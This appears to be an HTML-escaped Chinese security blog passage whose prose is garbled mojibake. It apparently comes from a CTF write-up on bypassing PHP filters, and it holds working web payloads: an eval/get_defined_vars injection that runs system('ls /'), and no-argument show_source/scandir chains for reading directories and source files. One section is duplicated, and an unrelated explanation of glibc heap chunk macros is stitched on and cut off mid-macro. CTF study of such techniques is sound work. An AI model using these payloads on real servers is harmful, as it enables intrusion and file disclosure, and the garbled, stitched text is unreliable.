class=&#34;mord&#34;&gt;Рѕњ&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;_FILES&lt;/p&gt;
&lt;p&gt;РђІ	ућ▒С║јжбўуЏ«СИГУ┐ЄТ╗цС║є&lt;/p&gt;
&lt;p&gt;РђІ	ждќтЁѕуА«У«цТў»тљдТюЅтЏъТўЙ№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;print_r&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;get_defined_vars&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	тЂЄтдѓУ»┤тјЪТюгтЈфТюЅСИђСИфтЈѓТЋ░ a№╝їжѓБС╣ѕтЈ»С╗ЦтцџтіаСИђСИфтЈѓТЋ░ b№╝їтљјжЮбтєЎтЁЦТЂХТёЈУ»ГтЈЦ№╝їpayload№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;a=&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;end&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;current&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;get_defined_vars&lt;/span&gt;())));&amp;amp;b=&lt;span class=&#34;title function_ invoke__&#34;&gt;system&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;ls /&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	Тіі eval ТЇбТѕљ assert С╣ЪУАї №╝їУЃйТЅДУАї system (Рђўls /РђЎ) т░▒УАї&lt;/p&gt;
&lt;h1 id=&#34;5chdir&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5chdir&#34;&gt;#&lt;/a&gt; 5.chdir()&lt;/h1&gt;
&lt;p&gt;РђІ	т«ътюеТЌаТ│Ћ rce№╝їтЈ»С╗ЦУђЃУЎЉуЏ«тйЋжЂЇтјєУ┐ЏУАїТќЄС╗ХУ»╗тЈќ№╝їСИЇУ┐ЄУ┐ЎжЄїућ▒С║јжбўуЏ«уџёУ┐ЄТ╗цТюЅуѓ╣ТЂХт┐ЃС║║№╝їТЅђС╗ЦтЈфтЦйУ«░тйЋСИђСИІТќ╣Т│ЋС║є№╝їТюЅС║єТю║С╝џтєЇУ┐ЏУАїт«ъУихсђѓ&lt;/p&gt;
&lt;p&gt;РђІ	тѕЕуће &lt;code&gt;getcwd()&lt;/code&gt;  УјитЈќтйЊтЅЇуЏ«тйЋ№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;getcwd&lt;/span&gt;());&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	у╗Њтљѕ dirname () тѕЌтЄ║тйЊтЅЇтиЦСйюуЏ«тйЋуџёуѕХуЏ«тйЋСИГуџёТЅђТюЅТќЄС╗ХтњїуЏ«тйЋ:.&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;var_dump&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;scandir&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;dirname&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;getcwd&lt;/span&gt;())));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	 У»╗СИіСИђу║ДТќЄС╗ХтљЇ№╝џ&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));&lt;/p&gt;
&lt;p&gt;?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));&lt;/p&gt;
&lt;p&gt;?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;РђІ	У»╗Та╣уЏ«тйЋ:&lt;/p&gt;
&lt;p&gt;РђІ	ord () тЄйТЋ░тњї chr () тЄйТЋ░№╝џтЈфУЃйт»╣уггСИђСИфтГЌугдУ┐ЏУАїУйгуаЂ№╝їord () у╝ќуаЂ№╝їchr) УДБуаЂ№╝їТюЅТдѓујЄС╝џУДБуаЂтЄ║ТќюТЮаУ»╗тЈќТа╣уЏ«тйЋ&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?code=print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;РђІ	УдЂуће chdir () тЏ║т«џ№╝їpayload№╝џ&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;?code=show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array() )))))))))));&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;6array_randУхїуІЌт┐ЁтцЄТ│Ћ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6array_randУхїуІЌт┐ЁтцЄТ│Ћ&#34;&gt;#&lt;/a&gt; 6.array_rand ()# УхїуІЌт┐ЁтцЄТ│Ћ№╝џ&lt;/h1&gt;
&lt;p&gt;РђІ	ждќтЁѕ№╝їтюеУ┐ЎжЄїтљљТДйСИђтЈЦ№╝їУхїуІЌСИЇтђ╝тЙЌтљїТЃЁ [doge]&lt;/p&gt;
&lt;p&gt;РђІ	тЈ»С╗ЦжђџУ┐Є array_rand () тЄйТЋ░жџЈТю║УјитЈќТЋ░у╗ёСИГуџёжћ«№╝їтЏаТГц№╝їжюђУдЂТЈљтЅЇт░єТЋ░у╗ёжћ«тђ╝т»╣у┐╗УйгС╗ЦСИІ№╝їУ«ЕтљјтєЇСй┐ућетдѓСИІ payload У┐ЏУАїУхїсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?exp=&lt;span class=&#34;title function_ invoke__&#34;&gt;show_source&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;array_rand&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;array_flip&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;scandir&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;current&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;localeconv&lt;/span&gt;())))));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	тЏаСИ║У┐ЎуДЇтЙѕУђЃжфїУ┐љТ░ћ№╝їтЏаТГц№╝їтйЊуЏ«тйЋСИГТќЄС╗ХУ┐ЄтцџуџёТЃЁтєхСИІтЈфТюЅУхїСИђТііУ┐љТ░ћ№╝їтЈ»УЃйСИђСИцСИІт░▒тЄ║С║є№╝їтЈ»УЃйУдЂУі▒тЙѕжЋ┐ТЌХжЌ┤№╝їтЏаТГц№╝їУ┐ўТў»жѓБтЈЦУ»Ю№╝їУхїуІЌСИЇтђ╝тЙЌтљїТЃЁ [doge]сђѓ&lt;/p&gt;
&lt;p&gt;РђІ&lt;/p&gt;
&lt;h1 id=&#34;тЈѓУђЃУхёТќЎ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#тЈѓУђЃУхёТќЎ&#34;&gt;#&lt;/a&gt; тЈѓУђЃУхёТќЎ№╝џ&lt;/h1&gt;
&lt;p&gt;РђІ	тЈ»С╗ЦжђџУ┐Є array_rand () тЄйТЋ░жџЈТю║УјитЈќТЋ░у╗ёСИГуџёжћ«№╝їтЏаТГц№╝їжюђУдЂТЈљтЅЇт░єТЋ░у╗ёжћ«тђ╝т»╣у┐╗УйгС╗ЦСИІ№╝їУ«ЕтљјтєЇСй┐ућетдѓСИІ payload У┐ЏУАїУхїсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?exp=&lt;span class=&#34;title function_ invoke__&#34;&gt;show_source&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;array_rand&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;array_flip&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;scandir&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;current&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;localeconv&lt;/span&gt;())))));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	тЏаСИ║У┐ЎуДЇтЙѕУђЃжфїУ┐љТ░ћ№╝їтЏаТГц№╝їтйЊуЏ«тйЋСИГТќЄС╗ХУ┐ЄтцџуџёТЃЁтєхСИІтЈфТюЅУхїСИђТііУ┐љТ░ћ№╝їтЈ»УЃйСИђСИцСИІт░▒тЄ║С║є№╝їтЈ»УЃйУдЂУі▒тЙѕжЋ┐ТЌХжЌ┤№╝їтЏаТГц№╝їУ┐ўТў»жѓБтЈЦУ»Ю№╝їУхїуІЌСИЇтђ╝тЙЌтљїТЃЁ [doge]сђѓ&lt;/p&gt;
&lt;p&gt;РђІ&lt;/p&gt;
&lt;h1 id=&#34;тЈѓУђЃУхёТќЎ-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#тЈѓУђЃУхёТќЎ-2&#34;&gt;#&lt;/a&gt; тЈѓУђЃУхёТќЎ№╝џ&lt;/h1&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0LzIzMDFfNzY2OTA5MDUvYXJ0aWNsZS9kZXRhaWxzLzEzMzgwODUzNg==&#34;&gt;https://blog.csdn.net/2301_76690905/article/details/133808536&lt;/span&gt;&lt;/p&gt;

 &lt;h1 id=&#34;уЏИтЁ│Т║љуаЂ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#уЏИтЁ│Т║љуаЂ&#34;&gt;#&lt;/a&gt; уЏИтЁ│Т║љуаЂ№╝џ&lt;/h1&gt;
&lt;h2 id=&#34;1-chunk-уЏИтЁ│Т║љуаЂ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-chunk-уЏИтЁ│Т║љуаЂ&#34;&gt;#&lt;/a&gt; 1. chunk уЏИтЁ│Т║љуаЂ№╝џ&lt;/h2&gt;
&lt;p&gt;РђІ	т»╣С║јућеТѕиТЮЦУ»┤№╝їтЈфжюђУдЂуА«С┐Ю malloc () тЄйТЋ░У┐ћтЏъуџётєЁтГўСИЇС╝џтЈЉућЪТ║бтЄ║№╝їт╣ХСИћтюеСИЇућеуџёТЌХтђЎСй┐уће free () тЄйТЋ░т░єтЁХжЄіТћЙ№╝їС╗ЦтљјС╣ЪСИЇтєЇтЂџС╗╗СйЋТЊЇСйютЇ│тЈ»сђѓУђїт»╣С║ј glibc ТЮЦУ»┤РђЎт«ЃУдЂтюеућеТѕиуггСИђТгАУ░Ѓуће malloc () тЄйТЋ░С╣ІтЅЇт»╣таєУ┐ЏУАїтѕЮтДІтїќ№╝ЏтюеућеТѕижбЉу╣Ђућ│У»итњїжЄіТћЙТЌХу╗┤Тіцтаєуџёу╗ЊТъёРђЎС┐ЮУ»ЂТЌХжЌ┤тњїуЕ║жЌ┤СИіуџёТЋѕујЄ№╝ЏтљїТЌХУ┐ўУдЂТБђТхІУ┐ЄуеІСИГтЈ»УЃйС║ДућЪуџёжћЎУ»»№╝їт╣ХтЈіТЌХу╗ѕТГбуеІт║Јсђѓ&lt;/p&gt;
&lt;p&gt;РђІ	ждќтЁѕ№╝їтЁѕуеЇтЙ«У»┤СИІтЄаСИфуЏИтЁ│уџёт«Јт«џС╣Ѕсђѓ&lt;/p&gt;
&lt;h3 id=&#34;request2size&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#request2size&#34;&gt;#&lt;/a&gt; request2size()№╝џ&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; request2size(req)								\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;(((req) + SIZE_SZ + MALLOC_ALIGN_MASK &amp;lt; MTNSIZE)  ?		\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;MINSIZE :												\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp;amp; ~MALLOC_ALIGN_MASK )&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; MALLOC_ALIGN_MASK		(MALLOC_ALIGNMENT - 1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; MALLOC_ALIGNMENT		(2 * SIZE_SZ)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	У┐ЎСИфт«Јт░єУ»иТ▒ѓуџё req УйгТЇбТѕљтїЁтљФ chunk тц┤жЃе№╝ѕpresize тњї size№╝Ѕуџё chunk тцДт░Ј№╝їуц║СЙІтдѓСИІ№╝ѕMINSIZE ж╗ўУ«цСИ║ 0x20№╝Ѕсђѓ&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;тйЊ req т▒ъС║ј [0,MINSIZE-MALLOC_ALIGN_MASK-SIZE_SZ)№╝їС╣Ът░▒Тў» [0,9) ТЌХ№╝їУ┐ћтЏъ 0x20 ;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;тйЊ req СИ║ 0x9 ТЌХ№╝ї У┐ћтЏъ (0x9+0x8+0xF)&amp;amp;~0xF №╝їС╣Ът░▒Тў» 0x20 №╝Џ&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;тйЊ req СИ║ 0x18 ТЌХ№╝їУ┐ћтЏъ (0x18+0x8+0xF)&amp;amp;~0xF№╝їС╣Ът░▒Тў» 0x20:&lt;/p&gt;
&lt;p&gt;У┐ЎжЄїтЈ»УЃйС╝џТюЅСИфжЌ«жбў№╝їжѓБт░▒Тў» 0x18 уџё user data тіаСИітц┤жЃе 0x10 т░▒ти▓у╗ЈТў» 0x28 С║є№╝їСИ║С╗ђС╣ѕУ┐ћтЏъуџё chunk тЇ┤Тў» 0x20 сђѓУ┐Ўт░▒Тў»тЏаСИ║тдѓТъютйЊтЅЇ chunk тюеСй┐ућеСИГ№╝їСИІСИђСИф chunk уџё prev_inuse ТѕљтЉўт░▒С╝џт▒ъС║јтйЊтЅЇ chunk №╝їТЅђС╗Цт░▒тцџтЄ║С║є 0x8 уџёСй┐ућеуЕ║жЌ┤сђѓУђЃУЎЉтѕ░У┐ЎСИђуѓ╣№╝їтйЊ req тюе 0x9~0x18 С╣ІжЌ┤ТЌХ№╝їт»╣т║ћуџё chunk тцДт░ЈСИ║ 0x10 №╝ЏтйЊ req тюе 0x19~0x28 С╣ІжЌ┤ТЌХ№╝їт»╣т║ћуџё chunk тцДт░ЈСИ║ 0x20 №╝їт╣ХС╗ЦТГцу▒╗Тјесђѓ&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;chunk2memтњї-mem2chunk&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#chunk2memтњї-mem2chunk&#34;&gt;#&lt;/a&gt; chunk2mem () тњї mem2chunk ()№╝џ&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; chunk2mem(p)		((void*)((char*)(p) + 2*SIZE_SZ))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; mem2chunk(mem)		((mchunkptr)((char*)(mem) - 2*SIZE_SZ))&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	chunk2mem () ТііТїЄтљЉ chunk уџёТїЄжњѕУйгтїќТѕљТїЄтљЉ user data уџёТїЄжњѕ№╝їтИИтЄ║уј░тюе malloc () тЄйТЋ░У┐ћтЏъТЌХ№╝Џmem2chunk () ТііТїЄтљЉ user data уџёТїЄжњѕУйгтїќТѕљТїЄтљЉ chunk уџёТїЄжњѕ№╝їтИИтЄ║уј░тюе free () тЄйТЋ░т╝ђтДІТЌХсђѓ&lt;/p&gt;
&lt;h3 id=&#34;chunkуіХТђЂуЏИтЁ│&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#chunkуіХТђЂуЏИтЁ│&#34;&gt;#&lt;/a&gt; chunk уіХТђЂуЏИтЁ│№╝џ&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;т«џС╣Ѕ PREV_INUSEсђЂIS_MMAPPEDсђЂNONMAIN_ARENA№╝ѕchunk Тў»тљдт▒ъС║јжЮъСИ╗у║┐уеІ№╝ЅС╗ЦтЈіт»╣СИЅУђЁУ┐ЏУАїТѕќУ┐љу«Ќ№╝ѕућеС║јТјЕуаЂ№╝Ѕсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* size field is or&amp;#x27;ed with PREV_INUSE when provious adjacent chunk in use */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; PREV_INUSE 0x1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* size field is or&amp;#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; IS_MMAPPED 0x2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* size field is or&amp;#x27;ed with NON_MAIN_ARENA if the chunk was obtained from a non-main arena .*/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; NON_MAIN_ARENA 0x4&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* Bits to mask off when extracting size. */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;жђџУ┐Є chunk ТїЄжњѕ p №╝їт»╣ТЪљТаЄт┐ЌСйЇУ┐ЏУАїТЈљтЈќсђЂТБђТЪЦсђЂуй«СйЇтњїТИЁТЦџТЊЇСйюсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; prev_inuse(p)			((p)-&amp;gt;size &amp;amp; PREV_INUSE)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; chunk_is_mmapped(p)		((p)-&amp;gt;size &amp;amp; IS_MMAPPED)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; chunk_non_main_arena(p)	((p)-&amp;gt;size &amp;amp; NON_MAIN_ARENA)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; inuse(p)												\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	((((mchunkptr) (((char *)(p)) + ((p)-&amp;gt;size &amp;amp; ~SIZE_BITS)))-&amp;gt;size) &amp;amp; PREV_INUSE)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; set_inuse(p)											\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;	((mchunkptr) (((char *)(p)) + ((p)-&amp;gt;size &amp;amp; ~SIZE_BITS)))-&amp;gt;size |= PREV_INUSE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;define&lt;/span&gt; clear_inuse(p)											\&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;((mchunkptr) (((char *) (p)) + ((p)-&amp;gt;size &amp;amp; ~SIZE_BITS)))-&amp;gt;&amp;gt;size &amp;amp;= 